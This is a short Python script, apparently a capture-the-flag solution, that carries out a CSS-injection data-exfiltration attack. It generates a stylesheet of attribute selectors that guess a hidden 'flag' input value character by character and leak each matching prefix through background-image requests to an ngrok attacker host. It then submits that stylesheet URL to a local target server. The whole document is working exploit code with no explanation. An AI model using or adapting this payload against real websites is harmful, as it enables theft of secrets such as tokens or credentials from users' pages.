from sys import argv
import sys


f=open('shell.css','w')
fuzz="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{_}"
flag=sys.argv[1]
for i in fuzz:
    tmp=flag
    payload='input[name=flag][value^="%s"] {background-image: url("http://788e-118-69-3-232.ngrok.io?flag=%s");}' % (tmp+i,tmp+i)
    f.write(payload+"\n")
f.close()

import requests
data={
    'css':'http://788e-118-69-3-232.ngrok.io/shell.css'
}
r=requests.post(url="http://192.168.75.131:1337/send.html",data=data)
print(r.text)